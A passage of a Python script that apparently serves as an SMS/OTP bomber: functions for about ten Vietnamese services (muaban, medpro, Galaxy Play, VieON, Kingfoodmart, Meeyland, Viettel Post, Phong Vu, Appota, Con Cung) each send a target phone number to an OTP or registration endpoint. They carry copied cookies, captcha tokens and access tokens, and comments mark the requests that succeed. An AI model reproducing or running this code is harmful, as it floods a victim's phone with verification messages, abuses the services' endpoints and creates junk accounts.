        # 'cookie': '_gcl_au=1.1.1958768879.1695660814; _hjSessionUser_2465791=eyJpZCI6IjJhN2YzMTgwLTQ3N2MtNWQ3MC05MGM2LWFkYThiM2QyNTVhMiIsImNyZWF0ZWQiOjE2OTU2NjA4MTQzMzEsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample_2465791=1; _hjSession_2465791=eyJpZCI6IjVkZmVkMGQ0LTA2NjgtNDJlYS1hNDFmLTE5YjkxOTc2MWZiZCIsImNyZWF0ZWQiOjE2OTU2NjA4MTQzMzMsImluU2FtcGxlIjp0cnVlfQ==; _hjAbsoluteSessionInProgress=0; _fbp=fb.1.1695660814522.1283895341; _tt_enable_cookie=1; _ttp=7XcIIhGYGs2aK8nDIsm5VT8EbTr; __gads=ID=9a1a3acde39ca731-22e58b6512e40037:T=1695660813:RT=1695660813:S=ALNI_MabqUCaZIs0oW1idOjkPniSiA355Q; __gpi=UID=00000c54099d30d8:T=1695660813:RT=1695660813:S=ALNI_MbZGtbS5V7dig3WfaJFOAiEoOzkUg',
        'origin': 'https://muaban.net',
        'referer': 'https://muaban.net/account/register?returnUrl=https%3A%2F%2Fmuaban.net%2Fbat-dong-san',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    }

    json_data = {
        'captcha': '03AFcWeA4llDuiIIWszOkw5_OA4IlaLpsKjEcZkPUsF5YRxMZ8xiUhZydQzQOxIDrjQQgldvffE4S-YuUWwiwhhicMdHoQ_muXKf8QppgNFd1X67r1jR_KDJCU0ZTk3HOU-MRtzp5m3c6cvAgZDb3_x-i7boyMKgx3JxhNbmjsIO4ViW-C2DCPxQb3GcXlZ2vB0iTQR5I6f2RvyVT9sAZuGCL04H1RHpKfmCPcptfrsJCqVAygHe2vbNLePW264DKKQZsYHJhGSXKdYsAiCjfaj7oaQIxpPUqbdspX9OwYNfZA8ln3UFFWxKoSaZkYSAjzZ7-isdEohHsOC3rKb-VBk66BQKKhvAuRLWt8TOnNisEt0NPw2YzpZi3xBCjXOAZykCy9yVG1E6QeUcDPtOBoxxAtszlAc9ZlSJtobB2DyvPe6OgoIDCuj-s2WDPqELUzrlYWuVDc1FDhKzAe-1yzfT82QzAryfFVHLGevj9-t2eHocyCp4frlZccDG152OV3c14T89xBLleo8LEHj1f1XmAywPUI4Q6xxHyuKT3LcWGP-6obG5N36uGN-vUa_JYnrHZecXhEvSTulHGXeDvXkIbIRZ5Wf1Q1Fg',
        'phone': phone,
        'is_register': True,
    }

    response = requests.post('https://muaban.net/identity/v1/otps/send', cookies=cookies, headers=headers, json=json_data)#success
###
def medpro():
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        'Origin': 'https://id-v121.medpro.com.vn',
        'Referer': 'https://id-v121.medpro.com.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36',
        'appid': 'medpro',
        'cskhtoken': '',
        'locale': '',
        'momoid': '',
        'osid': '',
        'ostoken': '',
        'partnerid': 'medpro',
        'platform': 'pc',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }

    json_data = {
        'fullname': 'người dùng medpro',
        'deviceId': 'bad828737ed3e312085df4d5824cd99d',
        'phone': phone,
        'type': 'password',
    }

    response = requests.post('https://api-v2.medpro.com.vn/user/phone-register', headers=headers, json=json_data)
###
def galaxy():
    headers = {
        'authority': 'api.glxplay.io',
        'accept': '*/*',
        'accept-language': 'vi',
        'access-token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiJkMWZiYWMxZi1lYTk2LTQwMjUtOTA1Ny02NDY2MjdiNWUyMjMiLCJkaWQiOiI3MTc4MmY0MS00N2Y4LTRjNGMtYjBmZi0zMzdiN2VhYjliMWYiLCJpcCI6IjE4My44MS41MC4xNTEiLCJtaWQiOiJOb25lIiwicGx0Ijoid2VifHBjfHdpbmRvd3N8MTB8Y2hyb21lIiwiYXBwX3ZlcnNpb24iOiIyLjAuMCIsImlhdCI6MTY5NTczMDU5OSwiZXhwIjoxNzExMjgyNTk5fQ.bVNui-9wMw6kUghS0b5KLRifbvCOo-mT0A0Cl08hcUA',
        # 'content-length': '0',
        'origin': 'https://galaxyplay.vn',
        'referer': 'https://galaxyplay.vn/',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'phone': phone,
    }

    response = requests.post('https://api.glxplay.io/account/phone/verify', params=params, headers=headers)#Thành Công
def vieon1():
    Headers = {"Host": "api.vieon.vn","content-length": "201","accept": "application/json, text/plain, */*","content-type": "application/x-www-form-urlencoded","sec-ch-ua-mobile": "?1","authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2ODE5MTU2NjYsImp0aSI6ImY1ZGI4MDJmNTZjMjY2OTg0OWYxMjY0YTY5NjkyMzU5IiwiYXVkIjoiIiwiaWF0IjoxNjc5MzIzNjY2LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTY3OTMyMzY2NSwic3ViIjoiYW5vbnltb3VzXzdjNzc1Y2QxY2Q0OWEzMWMzODkzY2ExZTA5YWJiZGUzLTdhMTIwZTlmYWMyNWQ4NTQ1YTNjMGFlM2M0NjU3MjQzLTE2NzkzMjM2NjYiLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiN2M3NzVjZDFjZDQ5YTMxYzM4OTNjYTFlMDlhYmJkZTMtN2ExMjBlOWZhYzI1ZDg1NDVhM2MwYWUzYzQ2NTcyNDMtMTY3OTMyMzY2NiIsInVhIjoiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBSTVgxOTE5KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTEwLjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2IiwiZHQiOiJtb2JpbGVfd2ViIiwibXRoIjoiYW5vbnltb3VzX2xvZ2luIiwibWQiOiJBbmRyb2lkIDEwIiwiaXNwcmUiOjAsInZlcnNpb24iOiIifQ.aQj5VdubC7B-CLdMdE-C9OjQ1RBCW-VuD38jqwd7re4","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","sec-ch-ua-platform": "\"Android\"","origin": "https://vieon.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://vieon.vn/?utm_source\u003dgoogle\u0026utm_medium\u003dcpc\u0026utm_campaign\u003dapproi_VieON_SEM_Brand_BOS_Exact_VieON_ALL_1865B_T_Mainsite\u0026utm_content\u003dp_--k_vieon\u0026pid\u003dapproi\u0026c\u003dapproi_VieON_SEM_Brand_BOS_Exact\u0026af_adset\u003dapproi_VieON_SEM_Brand_BOS_Exact_VieON_ALL_1865B\u0026af_force_deeplink\u003dfalse\u0026gclid\u003dCjwKCAjwiOCgBhAgEiwAjv5whOoqP2b0cxKwybwLcnQBEhKPIfEXltJPFHHPoyZgaTWXkY-SS4pBqRoCS2IQAvD_BwE","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Params = {"platform": "mobile_web","ui": "012021"}
    Payload = {"phone_number": phone,"password": "Vexx007","given_name": "","device_id": "7c775cd1cd49a31c3893ca1e09abbde3","platform": "mobile_web","model": "Android%2010","push_token": "","device_name": "Chrome%2F110","device_type": "desktop","ui": "012021"}
    response = requests.post("https://api.vieon.vn/backend/user/register/mobile", params=Params, data=Payload, headers=Headers)    
def kingfood():
    headers = {
        'authority': 'api.onelife.vn',
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'authorization': '',
        'content-type': 'application/json',
        'domain': 'kingfoodmart',
        'origin': 'https://kingfoodmart.com',
        'referer': 'https://kingfoodmart.com/',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36',
    }

    json_data = {
        'operationName': 'SendOTP',
        'variables': {
            'phone': phone[1:10],
        },
        'query': 'mutation SendOTP($phone: String!) {\n  sendOtp(input: {phone: $phone, captchaSignature: "", email: ""}) {\n    otpTrackingId\n    __typename\n  }\n}',
    }

    response = requests.post('https://api.onelife.vn/v1/gateway/', headers=headers, json=json_data)
###
def meyyland():
    headers = {
        'authority': 'v3.meeyid.com',
        'accept': '*/*',
        'accept-language': 'vi-VN',
        'content-type': 'application/json',
        'origin': 'https://meeyland.com',
        'referer': 'https://meeyland.com/',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36',
        'x-affilate-id': 'www.google.com',
        'x-browser-id': 'undefined',
        'x-client-id': 'meeyland',
        'x-partner-id': '',
    }

    json_data = {
        'phone': phone,
        'phoneCode': '+84',
        'refCode': '',
    }

    response = requests.post('https://v3.meeyid.com/auth/v4.1/register-with-phone', headers=headers, json=json_data)
###
def vtpost():
    cookies = {
        'QUIZIZZ_WS_COOKIE': 'id_192.168.12.139_15001',
        '_ga_9NGCREH08E': 'GS1.1.1696095404.1.0.1696095404.60.0.0',
        '_ga_L7ZKY279LR': 'GS1.1.1696095404.1.0.1696095404.0.0.0',
        '_gid': 'GA1.2.1441727509.1696095405',
        '_gat_gtag_UA_128396571_2': '1',
        '.AspNetCore.Antiforgery.XvyenbqPRmk': 'CfDJ8HU4DfyviudBttoZItatQ1qg4pQFH2lVLS4O_b6NBdLHeMDLTJCrX3ekHkjiVNUC5ONWX686JwsSlKjbNNeE_Tu163BgMut6AbA0g-s8g_o5bcApgnZ3eTWcL0VgWqE-EugZsN1G9AF7bkqYwBili-g',
        '_gat_gtag_UA_146347905_1': '1',
        '_gat_gtag_UA_142538724_1': '1',
        '_ga_7RZCEBC0S6': 'GS1.1.1696095405.1.1.1696095407.0.0.0',
        '_ga_WN26X24M50': 'GS1.1.1696095405.1.1.1696095407.0.0.0',
        '_ga': 'GA1.1.1413589922.1696095405',
        '_ga_P86KBF64TN': 'GS1.1.1696095405.1.1.1696095423.0.0.0',
    }

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        # 'Cookie': 'QUIZIZZ_WS_COOKIE=id_192.168.12.139_15001; _ga_9NGCREH08E=GS1.1.1696095404.1.0.1696095404.60.0.0; _ga_L7ZKY279LR=GS1.1.1696095404.1.0.1696095404.0.0.0; _gid=GA1.2.1441727509.1696095405; _gat_gtag_UA_128396571_2=1; .AspNetCore.Antiforgery.XvyenbqPRmk=CfDJ8HU4DfyviudBttoZItatQ1qg4pQFH2lVLS4O_b6NBdLHeMDLTJCrX3ekHkjiVNUC5ONWX686JwsSlKjbNNeE_Tu163BgMut6AbA0g-s8g_o5bcApgnZ3eTWcL0VgWqE-EugZsN1G9AF7bkqYwBili-g; _gat_gtag_UA_146347905_1=1; _gat_gtag_UA_142538724_1=1; _ga_7RZCEBC0S6=GS1.1.1696095405.1.1.1696095407.0.0.0; _ga_WN26X24M50=GS1.1.1696095405.1.1.1696095407.0.0.0; _ga=GA1.1.1413589922.1696095405; _ga_P86KBF64TN=GS1.1.1696095405.1.1.1696095423.0.0.0',
        'Origin': 'null',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }

    data = 'FormRegister.FullName=sdsdsds&FormRegister.Phone='+phone+'&FormRegister.Password=E*fWBtvMP43Z%21%3FD&FormRegister.ConfirmPassword=E*fWBtvMP43Z%21%3FD&ReturnUrl=%2Fconnect%2Fauthorize%2Fcallback%3Fclient_id%3Dvtp.web%26secret%3Dvtp-web%26scope%3Dopenid%2520profile%2520se-public-api%2520offline_access%26response_type%3Did_token%2520token%26state%3Dabc%26redirect_uri%3Dhttps%253A%252F%252Fviettelpost.vn%252Fstart%252Flogin%26nonce%3Db82dn87kqp9e3vlqyq5a5&ConfirmOtpType=Register&FormRegister.IsRegisterFromPhone=true&__RequestVerificationToken=CfDJ8HU4DfyviudBttoZItatQ1oMvSeV6AhlJqOozr_g04Sc6gcz0xwWeBX8XoEkAIMRgrEUvfm8DI5SJijVpAXqbgBXLY1hvs9PtgEwD-fSdP4-J204FeTw7PJgV4WMmWeWA8CcFw0FSWpYoGPdD85FH78'

    response = requests.post('https://id.viettelpost.vn/Account/SendOTPByPhone', cookies=cookies, headers=headers, data=data)
#####
def phongvu():
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi-VN,vi;q=0.9',
        'Connection': 'keep-alive',
        'Origin': 'https://phongvu.vn',
        'Referer': 'https://phongvu.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36',
        'content-type': 'application/json',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }

    json_data = {
        'challenge': '3dd8c92af2574a049cd0c3dc018d4cd7',
        'phone_number': phone,
        'client_id': '0d9440e352ca43c2a277e833e9d91480',
        'recaptcha_token': '03AFcWeA7xMMQbhU3oKUYYrCgnOM1GBE_Nya3nn3EwQ6IozIzsIowfRHQS_1dCHoM9q-bkoBPaITdj_gE5D2wOKgmeB2ZOi4zK55-xsd0gt94hY7ja92Evfr6PrhQ8Gq0gPQ7vWj8ctX4uGuaS7F9PBly4Fxxizi1v95gELOS3ouKkfoN6KtxIhfGJGkT3WI-dD6cT_M5RGTbFKCOumvjTVmDyTVajnJfRpj5-xmbEC56xbi3huponiv7qnsH4hStGLCQoWnyOgJKFflGY_9n1wmhn3tAnqZNpM50N07mgVzEAIH1zbzfHqJVz50Yy7qpaD5cowxM2jeqeR6WC8DX3TgrUI3FFKuCTuqcEFacF6odb46zzKGblqiaX-o8Py7WWtJNnQKyfW23vIXUdQ5V9LA4sQ5RF1GEQdnnV4R7Smc6czK0lljQugf8J-Ar27tkdoBQkIf750morRYDBnGIfJFRLa2xxkOMzUYRrOciXx6TVSjs5VVtJ_wTYd6IOay2CX1as67sxRv3JIFAoKdP6TPZ7AciUSYkkFCQDIaOmBZkVASA2VUxb6Lg80aKs1vOlznJ5mjM5K0Sel4DSywRmLHOqfUmm8AotIT65oaApG1OlFJllYFh5uQyp-yqkW3D3QV_On6MTfii4tqv4ut_I3n3WbonPcbMcAYfasGw9C94rrcug4Srp469zq2Vo5f6I1yKUo_EALmTcofxatX_ouhPU3BDd7oxLMS3dCH77ask2L27ETfwAN6Ri8BBStD5qb8qS5nZBmn1jDrQe5bo4fRcOvE3TfNNmZr1LhDuEs4zbTfyZj6iRJWngqGPxb0DGt-KI2H9mOhCMRvrdBL-LVuPUd-ytc6KZvN_0lO8YHhZ-pN-v_J10kgt8Y-knoBNPG_GRSy1H7RjEhE3iLM2NOVRlUch21v_FXaiKWMSUmJEaukK10Pf4gHCNnPLcJ5HO90SFPmyVH7lufbLkFzvfRyivkHOgCba-WQDODocj4jhHUJErmrV_-L6A1RKxqANGZbKIK4diED7chSTffVHeZTd8mHX-klBuvWC1_4505XzSQqdCe3knV09vX1IsHFjS7jpDTSs4wZRFNrDC6MvJZvB-b0X1Ubwzjhiyl9YMRDDOcejNKvc5023TmeWV3zcdEBYLJ-kwzDLCLE6QyHUAR7p3hkHmyEoVZxrgm7JDJfA1vRFWJfGYZcuNf-ina-ACWNfnKv1wMs85eRIzyG4YJ3U6_EYBfRgwgMI_8N_R8wZSPfVaSTZnreuBFPj5Jm1OElXgV-CqElUd1Rxe9YkAK8U0KRa2JVSvTJFGJ8jKzAlBcmFEIwsM3UJ_gSscCAIGfWrZXotKTR12xNtGWAx92cYfym8Ve0hmWNVzScQ_Eo20hq2LuU7wY8OWLNIpwTL6dNiNd8_2tjpDpIBmXjyJPVOzamauVPfFYznk9Ad-1LvB9foFpu8VYZMZd5OALR-YYqygE6SI2bW-rknWr8AF6TRlzE64miDBcGVF-XleFawEoLUVsS_HciKi8FM6hqFze0qU3OSKqROgWsVigm3cxnQKj7com80leJY12-HWswccnSoqNOnH8ktZyAvTCN7s7QSNo63VJiEe',
    }

    response = requests.post('https://identity.tekoapis.com/api/v1/passwordless/send', headers=headers, json=json_data)
###
def appota():
    cookies = {
        '_gid': 'GA1.2.967320211.1696148675',
        '_gat_gtag_UA_74938948_3': '1',
        '_ga_SQM4TCSQGX': 'GS1.1.1696148675.2.1.1696148694.0.0.0',
        '_ga': 'GA1.2.1900040304.1695224548',
        '_gat': '1',
        '_fbp': 'fb.1.1696148698664.980427030',
        '_ga_8W5EGNGFDP': 'GS1.2.1696148698.1.0.1696148698.0.0.0',
        'pay_session': 'eyJpdiI6IkQ5UzhzYndrdDdLWUJWRFJ0ZlptdUE9PSIsInZhbHVlIjoiVHNWYk90RWxzTG1HWWtnXC9VV05oK3FERjJ2VWlxRmIwOGc4KzV0NjV0cE84bzdsWWR1cmhOZUQ0VTlYbUR5Qk1XSlpUeVZwSHlNdzA2QWpLckRJR2NBPT0iLCJtYWMiOiIxNzM0M2U5ZmFmMWRmYzFhZWY5ZjQ0MGUzOTE2ZGQxMmNiZDA4NmY0MTE0MTJiMDFlZjBmODI3MTA4ZGFlOTY1In0%3D',
    }

    headers = {
        'authority': 'vi.appota.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '_gid=GA1.2.967320211.1696148675; _gat_gtag_UA_74938948_3=1; _ga_SQM4TCSQGX=GS1.1.1696148675.2.1.1696148694.0.0.0; _ga=GA1.2.1900040304.1695224548; _gat=1; _fbp=fb.1.1696148698664.980427030; _ga_8W5EGNGFDP=GS1.2.1696148698.1.0.1696148698.0.0.0; pay_session=eyJpdiI6IkQ5UzhzYndrdDdLWUJWRFJ0ZlptdUE9PSIsInZhbHVlIjoiVHNWYk90RWxzTG1HWWtnXC9VV05oK3FERjJ2VWlxRmIwOGc4KzV0NjV0cE84bzdsWWR1cmhOZUQ0VTlYbUR5Qk1XSlpUeVZwSHlNdzA2QWpLckRJR2NBPT0iLCJtYWMiOiIxNzM0M2U5ZmFmMWRmYzFhZWY5ZjQ0MGUzOTE2ZGQxMmNiZDA4NmY0MTE0MTJiMDFlZjBmODI3MTA4ZGFlOTY1In0%3D',
        'origin': 'https://vi.appota.com',
        'referer': 'https://vi.appota.com/',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone_number': phone,
    }

    response = requests.post('https://vi.appota.com/check-phone-register.html', cookies=cookies, headers=headers, data=data)
def concung():
    cookies = {
        '_aff_network': 'accesstrade',
        '_AFFI_TIME_ACTION_': '1697642736',
        '_AFFI_TRACK_INDEX_': '0EmLpyXjGnptjk4UeAmlPJ6dk9vLaTjSa4UA1DKPRr9aff8Z',
        '_ga': 'GA1.1.1876091056.1695050738',
        '_aff_network': 'accesstrade',
        '_gcl_au': '1.1.233522846.1695050740',
        '_tt_enable_cookie': '1',
        '_ttp': 'fMkv0Q--u4pizF6pr16jJrYOhjo',
        '_fbp': 'fb.1.1695050749021.679121103',
        '__admUTMtime': '1695050749',
        '__utm': 'source%3Daccesstrade',
        '__utm': 'source%3Daccesstrade',
        '__iid': '',
        '__iid': '',
        '__su': '0',
        '__su': '0',
        '__RC': '59',
        '__R': '3',
        'PHPSESSID': 'fq94uco87assoue6r9ae5fbeis',
        '_aff_sid': 'qxsdV5APuV69uTbR7XskbYEjNNAQl1NcYvunGk2S17FqSlko',
        '_AFFI_TRACK_': 'qxsdV5APuV69uTbR7XskbYEjNNAQl1NcYvunGk2S17FqSlko',
        '_AFFI_TIME_CUR_': '1698742425',
        '6f1eb01ca7fb61e4f6882c1dc816f22d': 'T%2FEqzjRRd5g%3D4ApySdB69bY%3Dt0NGhpEPGnY%3DZtO95WpaKJQ%3DH9DwywDLCIw%3Da7NDiPDjkp8%3DBMNH2%2FPz1Ww%3DjFPr4PEbB58%3DclOzA%2FMBSlk%3De%2F6TbLI9ilY%3DuFQxZw3NItE%3DUosS5IVXQ9o%3DkPh9kOfYL1I%3DtCawIVk%2BsM8%3Dv8gN4%2FH1iNc%3DHeYvDQBkHYA%3Dp7QLYc2vzvM%3Dn9M%2BXI5In%2Fg%3DGELfCGxOvjI%3DI00qP9ml%2FfY%3D',
        '__utma': '65249340.1876091056.1695050738.1695050753.1696150427.2',
        '__utmc': '65249340',
        '__utmz': '65249340.1696150427.2.2.utmcsr=accesstrade|utmgclid=CjwKCAjwseSoBhBXEiwA9iZtxvvZgaT3r-6JMHpSSn7wQ9Ey-unJtSPx9ZkX_dgWj2zSSlvSMaVLABoC71oQAvD_BwE|utmccn=(not%20set)|utmcmd=(not%20set)|utmctr=(not%20provided)',
        '_gac_UA-36329013-1': '1.1696150427.CjwKCAjwseSoBhBXEiwA9iZtxvvZgaT3r-6JMHpSSn7wQ9Ey-unJtSPx9ZkX_dgWj2zSSlvSMaVLABoC71oQAvD_BwE',
        '__utmt': '1',
        '_gcl_aw': 'GCL.1696150427.CjwKCAjwseSoBhBXEiwA9iZtxvvZgaT3r-6JMHpSSn7wQ9Ey-unJtSPx9ZkX_dgWj2zSSlvSMaVLABoC71oQAvD_BwE',
        '_aff_sid': 'qxsdV5APuV69uTbR7XskbYEjNNAQl1NcYvunGk2S17FqSlko',
        'dtdz': '62c57313-9d71-4f83-ab25-316ddef67081',
        '__utmb': '65249340.3.10.1696150427',
        '_ga_DFG3FWNPBM': 'GS1.1.1696150426.2.1.1696150450.36.0.0',
        '_ga_BBD6001M29': 'GS1.1.1696150427.2.1.1696150450.37.0.0',
        '__uif': '__uid%3A8589680751712265079%7C__ui%3A1%252C5%7C__create%3A1689680751',
        '__tb': '0',
        '__IP': '20392953',
        'Srv': 'cc205|ZRkzv|ZRkzn',
    }

    headers = {
        'authority': 'concung.com',
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '_aff_network=accesstrade; _AFFI_TIME_ACTION_=1697642736; _AFFI_TRACK_INDEX_=0EmLpyXjGnptjk4UeAmlPJ6dk9vLaTjSa4UA1DKPRr9aff8Z; _ga=GA1.1.1876091056.1695050738; _aff_network=accesstrade; _gcl_au=1.1.233522846.1695050740; _tt_enable_cookie=1; _ttp=fMkv0Q--u4pizF6pr16jJrYOhjo; _fbp=fb.1.1695050749021.679121103; __admUTMtime=1695050749; __utm=source%3Daccesstrade; __utm=source%3Daccesstrade; __iid=; __iid=; __su=0; __su=0; __RC=59; __R=3; PHPSESSID=fq94uco87assoue6r9ae5fbeis; _aff_sid=qxsdV5APuV69uTbR7XskbYEjNNAQl1NcYvunGk2S17FqSlko; _AFFI_TRACK_=qxsdV5APuV69uTbR7XskbYEjNNAQl1NcYvunGk2S17FqSlko; _AFFI_TIME_CUR_=1698742425; 6f1eb01ca7fb61e4f6882c1dc816f22d=T%2FEqzjRRd5g%3D4ApySdB69bY%3Dt0NGhpEPGnY%3DZtO95WpaKJQ%3DH9DwywDLCIw%3Da7NDiPDjkp8%3DBMNH2%2FPz1Ww%3DjFPr4PEbB58%3DclOzA%2FMBSlk%3De%2F6TbLI9ilY%3DuFQxZw3NItE%3DUosS5IVXQ9o%3DkPh9kOfYL1I%3DtCawIVk%2BsM8%3Dv8gN4%2FH1iNc%3DHeYvDQBkHYA%3Dp7QLYc2vzvM%3Dn9M%2BXI5In%2Fg%3DGELfCGxOvjI%3DI00qP9ml%2FfY%3D; __utma=65249340.1876091056.1695050738.1695050753.1696150427.2; __utmc=65249340; __utmz=65249340.1696150427.2.2.utmcsr=accesstrade|utmgclid=CjwKCAjwseSoBhBXEiwA9iZtxvvZgaT3r-6JMHpSSn7wQ9Ey-unJtSPx9ZkX_dgWj2zSSlvSMaVLABoC71oQAvD_BwE|utmccn=(not%20set)|utmcmd=(not%20set)|utmctr=(not%20provided); _gac_UA-36329013-1=1.1696150427.CjwKCAjwseSoBhBXEiwA9iZtxvvZgaT3r-6JMHpSSn7wQ9Ey-unJtSPx9ZkX_dgWj2zSSlvSMaVLABoC71oQAvD_BwE; __utmt=1; _gcl_aw=GCL.1696150427.CjwKCAjwseSoBhBXEiwA9iZtxvvZgaT3r-6JMHpSSn7wQ9Ey-unJtSPx9ZkX_dgWj2zSSlvSMaVLABoC71oQAvD_BwE; _aff_sid=qxsdV5APuV69uTbR7XskbYEjNNAQl1NcYvunGk2S17FqSlko; dtdz=62c57313-9d71-4f83-ab25-316ddef67081; __utmb=65249340.3.10.1696150427; _ga_DFG3FWNPBM=GS1.1.1696150426.2.1.1696150450.36.0.0; _ga_BBD6001M29=GS1.1.1696150427.2.1.1696150450.37.0.0; __uif=__uid%3A8589680751712265079%7C__ui%3A1%252C5%7C__create%3A1689680751; __tb=0; __IP=20392953; Srv=cc205|ZRkzv|ZRkzn',
        'origin': 'https://concung.com',
        'referer': 'https://concung.com/dang-nhap.html',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'ajax': '1',
        'classAjax': 'AjaxLogin',
        'methodAjax': 'sendOtpLogin',
        'customer_phone': phone,
